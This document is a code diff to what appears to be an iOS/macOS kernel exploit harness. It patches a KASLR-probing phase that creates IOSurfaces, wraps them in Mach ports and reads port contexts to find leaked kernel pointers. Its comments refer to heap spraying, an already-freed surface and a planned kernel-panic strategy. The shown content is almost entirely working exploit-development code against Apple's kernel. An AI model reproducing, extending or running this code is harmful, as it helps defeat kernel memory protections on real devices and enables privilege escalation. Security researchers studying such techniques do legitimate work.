@@ -22576,8 +22576,26 @@ new_modes:
             rlog("\n=== Phase 19 (r=229): Deep KASLR Probing ===\n");
 
             uint64_t p19_leaked = 0;
-            IOSurfaceRef match_surf = r229_spray_static[r229_matched_idx];
-            if (!match_surf) { rlog("  No match surface!\n"); goto p19_done; }
+            /* Create a fresh surface for probing — the match surface was freed in 17v2 step E */
+            CFMutableDictionaryRef p19_props = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int p19_w = 64, p19_h = 64, p19_bpr = 256, p19_as = 64*256;
+            int p19_pf = 0x42475241; /* BGRA */
+            CFDictionarySetValue(p19_props, CFSTR("IOSurfaceWidth"),
+                CFNumberCreate(NULL, kCFNumberIntType, &p19_w));
+            CFDictionarySetValue(p19_props, CFSTR("IOSurfaceHeight"),
+                CFNumberCreate(NULL, kCFNumberIntType, &p19_h));
+            CFDictionarySetValue(p19_props, CFSTR("IOSurfaceBytesPerRow"),
+                CFNumberCreate(NULL, kCFNumberIntType, &p19_bpr));
+            CFDictionarySetValue(p19_props, CFSTR("IOSurfaceAllocSize"),
+                CFNumberCreate(NULL, kCFNumberIntType, &p19_as));
+            CFDictionarySetValue(p19_props, CFSTR("IOSurfacePixelFormat"),
+                CFNumberCreate(NULL, kCFNumberIntType, &p19_pf));
+            IOSurfaceRef match_surf = IOSurfaceCreate(p19_props);
+            CFRelease(p19_props);
+            if (!match_surf) { rlog("  Failed to create probe surface!\n"); goto p19_done; }
+            rlog("  Probe surface: id=%u addr=%p\n",
+                 IOSurfaceGetID(match_surf), (void *)match_surf);
 
             /* 19a: IOSurfaceCreateMachPort + port probing */
             rlog("\n  --- 19a: IOSurfaceCreateMachPort ---\n");
@@ -22616,16 +22634,32 @@ new_modes:
                     rlog("  LookupFromMachPort: %p (match=%p)\n",
                          (void *)looked, (void *)match_surf);
 
-                    /* Create ports for ALL spray surfaces and check each */
+                    /* Create additional test surfaces and check ports */
                     int ports_with_ctx = 0;
-                    for (int si = 0; si < 256 && si < 10; si++) {
-                        if (!r229_spray_static[si]) continue;
-                        mach_port_t sp = IOSurfaceCreateMachPort(r229_spray_static[si]);
+                    IOSurfaceRef p19_test[8];
+                    for (int si = 0; si < 8; si++) {
+                        CFMutableDictionaryRef tp = CFDictionaryCreateMutable(NULL, 0,
+                            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                        int tw = 32 + si * 8, th = 32, tbpr = tw * 4, tas = th * tbpr;
+                        CFDictionarySetValue(tp, CFSTR("IOSurfaceWidth"),
+                            CFNumberCreate(NULL, kCFNumberIntType, &tw));
+                        CFDictionarySetValue(tp, CFSTR("IOSurfaceHeight"),
+                            CFNumberCreate(NULL, kCFNumberIntType, &th));
+                        CFDictionarySetValue(tp, CFSTR("IOSurfaceBytesPerRow"),
+                            CFNumberCreate(NULL, kCFNumberIntType, &tbpr));
+                        CFDictionarySetValue(tp, CFSTR("IOSurfaceAllocSize"),
+                            CFNumberCreate(NULL, kCFNumberIntType, &tas));
+                        CFDictionarySetValue(tp, CFSTR("IOSurfacePixelFormat"),
+                            CFNumberCreate(NULL, kCFNumberIntType, &p19_pf));
+                        p19_test[si] = IOSurfaceCreate(tp);
+                        CFRelease(tp);
+                        if (!p19_test[si]) continue;
+                        mach_port_t sp = IOSurfaceCreateMachPort(p19_test[si]);
                         if (sp != MACH_PORT_NULL) {
                             mach_port_context_t c = 0;
                             mach_port_get_context(mach_task_self(), sp, &c);
                             if (c != 0) {
-                                rlog("  spray[%d] port ctx=0x%llx\n",
+                                rlog("  test[%d] port ctx=0x%llx\n",
                                      si, (unsigned long long)c);
                                 ports_with_ctx++;
                                 if ((c >> 40) == 0xfffffe && !p19_leaked)
@@ -22635,6 +22669,8 @@ new_modes:
                         }
                     }
                     rlog("  Ports with nonzero ctx: %d\n", ports_with_ctx);
+                    for (int si = 0; si < 8; si++)
+                        if (p19_test[si]) CFRelease(p19_test[si]);
 
                     mach_port_deallocate(mach_task_self(), surf_port);
                 }
@@ -22888,6 +22924,7 @@ new_modes:
                 rlog("Next: try two-boot panic strategy or kernelcache analysis.\n");
             }
             rlog("--- Phase 19 complete ---\n");
+            if (match_surf) CFRelease(match_surf);
 
             p19_done: ;
         }
